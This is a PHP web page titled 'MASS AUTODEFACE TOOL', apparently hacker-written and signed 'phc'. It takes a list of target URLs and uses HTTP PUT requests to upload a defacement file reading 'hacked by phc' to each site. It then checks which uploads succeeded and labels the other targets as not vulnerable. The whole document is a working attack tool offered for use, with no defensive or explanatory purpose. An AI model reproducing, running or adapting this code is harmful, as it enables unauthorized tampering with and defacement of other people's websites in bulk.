<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<style>
.kotak
{
border-radius:5px; 
width:80%;
text-align:left;
font-size:large;
background-color:black;
border: 1px solid green;
color:grey;
height:30%;
}
.kotaks
{
border-radius:5px; 
width:80%;
text-align:center;
font-size:large;
background-color:black;
border: 1px solid green;
color:grey;

}
.fon
{
color:grey;
}
.t
{
color:white;
font-size:40px;
}
.suk
{
color:green;
}
.fel
{
color:red;
}
.fn
{
color:red;
}
body
{
background-color:black;
}
.buton{ width:80%; 	box-shadow:inset 0px 1px 0px 0px #cf866c; 	background:linear-gradient(to bottom, #d0451b 5%, #bc3315 100%); 	background-color:#d0451b; 	border-radius:3px; 	border:1px solid #942911; 	display:inline-block; 	cursor:pointer; 	color:#ffffff; 	font-family:Arial; 	font-size:13px; 	padding:6px 24px; 	text-decoration:none; 	text-shadow:0px 1px 0px #854629; } 
.buton:hover { 	background:linear-gradient(to bottom, #bc3315 5%, #d0451b 100%); 	background-color:#bc3315; } 
.buton:active { 	position:relative; 	top:1px; } 
.res
{
height:400%;
width:100%;
}
</style>


<center>
<font class="t">MASS AUTODEFACE TOOL</font><br /><br /><br />
<font class="fon">
<form action="" method="post">
        Filename:<br /><input class="kotaks" name="file" value="hejes.txt"><br />
        Text:<br />
        <textarea class="kotak" name="isi">hacked by phc</textarea><br />
        Target url:<br />
        <textarea class="kotak" name="urls">http://my-resume.biz/</textarea><br />
        <input class="buton" value="Hejes!!!" type="submit">
        </form>

</font>
</center>
<hr>
<div class="res">
<?php
ini_set('max_execution_time', '0');
set_time_limit(0);



/*
       _____    __   __  ______
      / ___ \  / /  / / / ____/
     / /__/ / / /__/ / / /
    / _____/ / ___  / / /
   / /      / /  / / / /____
  /_/      /_/  /_/ /______/


*/





$urls     = $_POST["urls"];
$isi      = $_POST["isi"];
$filename = $_POST["file"];




$taz       = fopen("sementara.phc", "w+");
             fwrite($taz, $isi);
             fclose($taz);
$filepath  = "sementara.phc";
$filesize  = filesize($filepath);


$fh        = fopen($filepath, 'r');
//tuk curl hejes

function phc($url)
{
global $filename;
global $isi;
global $filepath;
global $fh;
global $filesize;
global $taz;


$ch = curl_init($url ."/". $filename);
curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
curl_setopt($ch, CURLOPT_PUT, true);
curl_setopt($ch, CURLOPT_INFILE, $fh);
curl_setopt($ch, CURLOPT_INFILESIZE, $filesize);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
$cek = curl_exec($ch);
$err = curl_getinfo($ch, CURLINFO_HTTP_CODE);
       curl_close($ch);
return $err;


}

//kurul
function kur($url)
{
global $filename;
  $cu = curl_init($url."/".$filename);
         curl_setopt($cu, CURLOPT_RETURNTRANSFER, true);
         curl_exec($cu);
  $err = curl_getinfo($cu, CURLINFO_HTTP_CODE);
         curl_close($cu);
return $err;
}


if($urls === null)
{ die(); }



$exp = explode(PHP_EOL, $urls);

foreach($exp as $urli)
{
$url =preg_replace( "/\r|\n/", "", $urli);
$phantom = phc($url);

 if($phantom == 201 || $phantom == 200)
  { 
   $cekerr = kur($url);
   if($cekerr == 200)
    {
     echo '<font class="fon">sukses:<font class="suk">'.$url.'/'.$filename.'<font></font><br />';
    }
    else
    {
    echo "<font class='fon'>failed:<font class='fel'>".$url."</font></font><br />";
    }
  }
 else
  {
  echo "<font class='fon'>Xvuln:<font class='fel'>".$url."</font></font><br />";
  }

} 
fclose($fh);  
unlink("sementara.phc");  
?> 
</div>
</body>
</html>

